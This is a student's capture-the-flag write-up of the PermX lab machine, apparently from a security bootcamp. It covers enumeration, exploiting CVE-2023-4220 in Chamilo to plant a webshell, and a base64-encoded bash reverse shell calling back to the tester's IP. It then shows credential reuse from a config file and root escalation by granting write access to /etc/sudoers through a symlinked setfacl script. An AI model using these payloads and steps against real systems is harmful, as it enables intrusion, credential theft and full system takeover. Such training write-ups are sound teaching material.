# Welcome to my Permx Walkthrough!
This is what I wrote as a submission for a homework assignment during a bootcamp for CPTC. I needed a lot of help from the ippsec walkthrough, so these are definitely not original methods. Enjoy!

# Enumeration

### Nmap scan

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 15:28 EDT
Nmap scan report for 10.10.11.23
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```

There is some important information here. We can see that this is an Ubuntu machine running an Apache webserver and Openssh. We also get the domain name, permx.htb. However, the server attempts to redirect, hinting that there may be a subdomains set up from name-based virtual hosting.

Before attempting to find subdomains, we need a way to resolve to the domain. Let’s add an entry into our hosts file.

```bash
10.10.11.23     permx.htb
```

### Looking for a subdomain

We can take a look through the website, but most of the buttons redirect back to permx.htb. The tool that we’ll use this time to enumerate subdomains is FFUF. 

```markdown
┌──(root㉿kali)-[/home/kali]
└─# ffuf -u http://permx.htb -H 'HOST: FUZZ.permx.htb' -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1389ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1560ms]
:: Progress: [4989/4989] :: Job [1/1] :: 406 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Initially, we receive a whole stream of attempts and failures. That can be solved with the -mc flag (matcher built in into FFUF) that lets us filter for success codes. 

We can add the new subdomains discovered into the hosts file. The updated entry will look like this. 

```markdown
10.10.11.23     permx.htb www.permx.htb lms.permx.htb
```

### Checking out lms.permx.htb

What we see here is a login page that seems to be run with Chamilo. Doing research tells us that Chamilo is a learning management system, that runs on php and has a github repository.

![image.png](attachment:517c46bd-4c25-4f40-9ba8-51da81de5cff:image.png)

### What version of Chamilo is running on PermX?

Looking at the Github repository, the README tells us that the stable version is 1.11.x. So, we must change the branch from master to 1.11.x. Next, we want to look for a file that has changed recently. In the documentation folder, there is a file called changelog.html that changed 3 weeks ago. The idea is try to take the a recently edited file from the most recent commit and compare it with what exists on the website now. 

Let’s get the repo and the desired file first

```markdown
git clone https://github.com/chamilo/chamilo-lms.git
curl -o http://lms.permx.htb/documentation/changelog.html
```

Let’s read the commit details

```markdown
──(root㉿kali)-[/home/kali/chamilo-lms]
└─# git log -- documentation/changelog.html
commit a8672ba8c1c124e8c4c1983de2064cc30264bc6e
Author: Julio Montoya <gugli100@gmail.com>
Date:   Sat Dec 12 11:24:20 2020 +0100

    Internal: Move documentation into public folder

commit 08bdc71918b47baaa628a24d39ead96db3c71cd0
Author: Angel Fernando Quiroz Campos <angelfqc.18@gmail.com>
Date:   Wed Dec 12 12:25:59 2018 -0500

    Minor - Update changelog #2708
:
```

There are more commits of course, but the most important detail here is the commit hash. The hash will let us view any file that we want. 

Now what if we only want to view the hashes?

```markdown
┌──(root㉿kali)-[/home/kali/chamilo-lms]
└─# git log --pretty=format:%H -- documentation/changelog.html
a8672ba8c1c124e8c4c1983de2064cc30264bc6e
08bdc71918b47baaa628a24d39ead96db3c71cd0
2018ff7c9b0059b295a470e9d4522988cec54c79
516d4434b363c0467a3f41fa9e721dcf67367e3a
a3b46b86cb27e90dc183775241c78345ae9aa8d1
```

This will help us later

Let’s explore how to use the hash to view the any changelog.html file that we want.

```markdown
┌──(root㉿kali)-[/home/kali/chamilo-lms]
└─# git show dfd238cfa308c3f89f5f59773d4ad7d4262dbd48:documentation/changelog.html         
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Chamilo Changelog</title>
    <link rel="stylesheet" href="../main/css/base.css" type="text/css" media="screen,projection" />
    <link rel="stylesheet" href="default.css" type="text/css" />
    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon" />
</head>
:
```

Now that we know it works, we can pipe the output into the md5sum command. Then, with the obtained md5sums, we can compare it to the changelog.html that we curled earlier. Let’s get the md5sum of the changelog.html file we curled.

```markdown
──(root㉿kali)-[/home/kali]
└─# md5sum changelog.html 
6e236865d19ae1facb7b5a2c12e16a4f  changelog.html
```

Let’s construct a for loop that will automate this process

```markdown
──(root㉿kali)-[/home/kali/chamilo-lms]
└─# for commit in $(git log --all --pretty=format:%H -- documentation/changelog.html); do echo -n "$commit "; git show $commit:documentation/changelog.html | md5sum; done | grep '6e236865d19ae1facb7b5a2c12e16a4f'
bdd5948f0b8f1771464de7bf72ca98f2f82b60ea 6e236865d19ae1facb7b5a2c12e16a4f  - 
```

This for loop will iterate through the list of hashes that we summon. This time, it will iterate through all branches of commits, not just the master branch. For every iteration, it will print the commit hash and the md5sum on the same line.

Let’s check out the commit.

```markdown
┌──(root㉿kali)-[/home/kali/chamilo-lms]
└─# git show bdd5948f0b8f1771464de7bf72ca98f2f82b60ea 

commit bdd5948f0b8f1771464de7bf72ca98f2f82b60ea
Author: Yannick Warnier <ywarnier@beeznest.org>
Date:   Thu Aug 31 15:26:05 2023 +0200

    Documentation: Update changelog

diff --git a/documentation/changelog.html b/documentation/changelog.html
index 00e32192ab..88a48c3cd3 100755
--- a/documentation/changelog.html
+++ b/documentation/changelog.html
@@ -112,7 +112,7 @@
 
     <div class="version" aria-label="1.11.24">
         <a id="1.11.24"></a>
-        <h1>Chamilo 1.11.24 - Beersel, 30/08/2023</h1>
+        <h1>Chamilo 1.11.24 - Beersel, 31/08/2023</h1>
         <h3>Release notes - summary</h3>
         <p>Chamilo 1.11.22 is a security fix release on top of 1.11.22.</p>
         <h3>Release name</h3>
```

The Chamilo version number is 1.11.24

# Getting shell

### Finding the vulnerability for our version of Chamilo

Let’s look for some vulnerabilities. Checking out one vulnerability shows high exploitation rates for our version number. 

![image.png](attachment:43a5feea-69da-4eb9-98d5-aa766cda9b67:image.png)

This vulnerability lets us upload a php webshell in a specific folder /main/inc/lib/javascript/bigupload/files. From there, we can slide in a command for a bash reverse shell encoded in base64. Luckily, there’s a tool that helps us do this. 

A quick search helps us find a tool for CVE-2023-4220.

![image.png](attachment:b523c0e1-ab61-4a2e-ac9a-b98ebe43ffce:image.png)

### Using the tool

Here’s the setup for the tool.

```markdown
git clone https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS.git
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

We need to setup a virtual environment because there are some libraries that we can’t install without destroying the global python environment. Then, activate the environment and install the requirements.txt file. 

Your shell should look like this

```markdown
┌──(venv)─(root㉿kali)-[/home/kali/CVE-2023-4220-Chamilo-LMS]

```

You are handed two pieces of syntax

```markdown
python3 main.py -u http://example.com/chamilo -a scan
python3 main.py -u http://example.com/chamilo -a webshell
```

One helps you scan to determine if your domain is vulnerable and one sets up the url needed for the webshell. Since we already know that our version of Chamilo is vulnerable, we can just jump straight into the webshell.

```markdown
┌──(venv)─(root㉿kali)-[/home/kali/CVE-2023-4220-Chamilo-LMS]
└─# python3 main.py -u http://lms.permx.htb -a webshell
[+] Upload successfull [+]

Webshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=<command>

```

Verify which user that you spawn in and that the webshell works. 

```markdown
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=whoami
```

![image.png](attachment:a1e34645-5ab8-4bf7-933a-d2eab71a1cdd:image.png)

### Getting a reverse shell

Head to [revshells.com](http://revshells.com) and grab a simple bash reverse shell with our ip address that calls back to ourselves.

```markdown
sh -i >& /dev/tcp/10.10.14.15/9001 0>&1
```

Next, we need to encode the bash shell into base64. This helps us fit into url encoding a little more cleanly.

```markdown
──(root㉿kali)-[/home/kali]
└─# echo 'sh -i >& /dev/tcp/10.10.14.15/9001 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUvOTAwMSAwPiYxCg==
```

Now that we have our encoded shell, let’s build a command for the webserver to decode and run.

```markdown
echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUvOTAwMSAwPiYxCg==' | base64 -d | bash
```

But not so fast, let’s test it on ourselves to make sure it functions.

```markdown
┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 9001   
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.14.15] 54044
$  
```

While listening, this is the prompt that comes up when testing. Now, let’s run it on the webserver.

```markdown
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUvOTAwMSAwPiYxCg==' | base64 -d | bash
```

Here’s what to put into the url.

```markdown
┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.23] 58688
sh: 0: can't access tty; job control turned off
$ 
```

We have shell access. 

let’s stabilize our shell.

```markdown
$ python3 -c 'import pty; pty.spawn("bash")'
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

# Getting Shell as mtz

### Finding the config file for Chamilo.

Google the configuration file for chamilo, should tell you that the file name is configuration.php. We can confirm that the file exists.

```bash
$ find / -name configuration.php 2>/dev/null                     
/var/www/chamilo/app/config/configuration.php
```

### Logging in as mtz

While searching through the configuration file, we stumble upon a database password. Of course, instead of reading all of it, it can be found much easier if we grep for the word pass.

```markdown
cat /var/www/chamilo/app/config/configuration.php | grep pass
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

Now we need users to find and test it against. 

```markdown
<t/bigupload/files$ cat /etc/passwd | grep /bin/bash                     
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

mtz is the only standard user to test this against. 

Let’s login

```markdown
su - mtz
cat user.txt
61d30b0224e4192-----------------
```

We spawn in into mtz’s home directory with the user flag

# Privilege Escalation

Now that we have credentials, make sure to ssh in, as we would love to have a much more functional shell.

```markdown
ssh mtz@permx.htb
```

### What forbidden commands are we allowed to run as mtz?

```markdown
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

As mtz, we can run /opt/[acl.sh](http://acl.sh) without getting prompted for a password.

What does /opt/[acl.sh](http://acl.sh) do?

```markdown
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

At the bottom, there’s a convenient line that gives us access to setfacl. Setfacl stands for set file access control lists. We can set our desired permissions (rwx) on a desired file. Let’s go with the sudoers file. However, /opt/acl.sh doesn’t accept targets (files) outside of the home directory for mtz. To bypass that limitation, we need to use symbolic links, as the acls set by setfacl follow the link by default. 

### Running /opt/acl.sh

```markdown
ln -s /etc/sudoers
sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
```

We should have read, write and execute permissions over our /etc/sudoers. Let’s check

```markdown
mtz@permx:~$ getfacl ./sudoers
# file: sudoers
# owner: root
# group: root
user::r--
user:mtz:rwx
group::r--
mask::rwx
other::---
```

It doesn’t matter if you run getfacl on the link or the file the link references to. 

```markdown
mtz@permx:~$ getfacl /etc/sudoers
getfacl: Removing leading '/' from absolute path names
# file: etc/sudoers
# owner: root
# group: root
user::r--
user:mtz:rwx
group::r--
mask::rwx
other::---
```

When we go to edit the sudoers file, at the bottom, there should be this line granting us no password over /opt/acl.sh.

```markdown
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
```

Let’s change that

```markdown
mtz ALL=(ALL:ALL) NOPASSWD: ALL
```

Let’s escalate our shell

```markdown
mtz@permx:~$ sudo bash
root@permx:/home/mtz#
```

Finally, let’s get the root flag.

```markdown
root@permx:/home/mtz# cd ~
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
d4a303b4ff793a27f6c05e45dfbdf3bd
```
